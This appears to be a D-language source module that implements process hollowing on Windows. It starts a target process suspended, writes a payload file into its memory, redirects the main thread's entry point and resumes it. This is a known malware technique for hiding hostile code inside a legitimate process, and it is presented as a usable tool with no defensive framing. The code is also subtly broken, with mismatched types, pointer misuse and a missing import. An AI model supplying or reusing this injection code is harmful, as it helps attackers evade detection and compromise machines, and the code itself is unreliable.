module hollowing;

import std.exception;
import std.file;
import std.stdio;
import windows;
import utils;

Result!string hollowProcess(string targetProcess, string payloadPath) {
    ensureFileExists(payloadPath);

    auto payload = cast(void*)readPayload(payloadPath);

    StartupInfo startupInfo;
    ProcessInformation processInfo;
    Context context;

    startupInfo.cb = cast(uint)StartupInfo.sizeof;

    auto processHandleResult = createSuspendedProcess(targetProcess, &startupInfo, &processInfo);
    if (processHandleResult.isError) {
        return processHandleResult;
    }

    scope(exit) closeProcessHandles(processInfo);

    context.context_flags = context_full;
    if (!GetThreadContext(processInfo.h_thread, &context)) {
        return Err!string("Failed to get thread context. Error: " ~ GetLastError().to!string);
    }

    auto imageBaseAddr = getImageBaseAddress(processInfo.h_process, context.ebx + 8);

    if (!writePayloadToProcess(processInfo.h_process, imageBaseAddr, payload, payload.length)) {
        return Err!string("Failed to write payload to process. Error: " ~ GetLastError().to!string);
    }

    if (!setThreadEntryPoint(processInfo.h_thread, context, cast(uint)imageBaseAddr)) {
        return Err!string("Failed to set thread entry point. Error: " ~ GetLastError().to!string);
    }

    if (ResumeThread(processInfo.h_thread) == DWORD.max) {
        return Err!string("Failed to resume the process. Error: " ~ GetLastError().to!string);
    }

    return Ok!string("Process hollowing completed successfully.");
}

ubyte[] readPayload(string filePath) @safe {
    return cast(ubyte[])read(filePath);
}

void ensureFileExists(string filePath) @safe {
    enforce(exists(filePath), new Exception("File not found: " ~ filePath));
}

Result!HANDLE createSuspendedProcess(string targetProcess, StartupInfo startupInfo, ProcessInformation processInfo) @system {
    bool success = CreateProcessA(
        targetProcess.toStringz,
        null,
        null,
        null,
        false,
        CREATE_SUSPENDED,
        null,
        null,
        &startupInfo,
        &processInfo
    );

    if (!success) {
        return Err!HANDLE("Failed to create the process. Error: " ~ GetLastError().to!string);
    }

    return Ok!HANDLE(processInfo.h_process);
}

void* getImageBaseAddress(HANDLE processHandle, void* baseAddressPtr) @system {
    uint originalImageBase;
    SIZE_T bytesRead;

    if (!ReadProcessMemory(processHandle, baseAddressPtr, &originalImageBase, uint.sizeof, &bytesRead)) {
        throw new Exception("Failed to read process memory. Error: " ~ GetLastError().to!string);
    }

    if (bytesRead != uint.sizeof) {
        throw new Exception("Unexpected number of bytes read.");
    }

    return cast(void*)originalImageBase;
}

bool writePayloadToProcess(HANDLE processHandle, void* imageBaseAddr, void* payload, size_t payloadSize) @system {
    SIZE_T bytesWritten;

    if (!WriteProcessMemory(processHandle, imageBaseAddr, payload, payloadSize, &bytesWritten)) {
        return false;
    }

    if (bytesWritten != payloadSize) {
        return false;
    }

    return true;
}

bool setThreadEntryPoint(HANDLE hThread, Context context, uint newEntryPoint) @system {
    context.eax = newEntryPoint;
    return SetThreadContext(hThread, &context);
}

void closeProcessHandles(ProcessInformation processInfo) @trusted {
    CloseHandle(processInfo.h_thread);
    CloseHandle(processInfo.h_process);
}
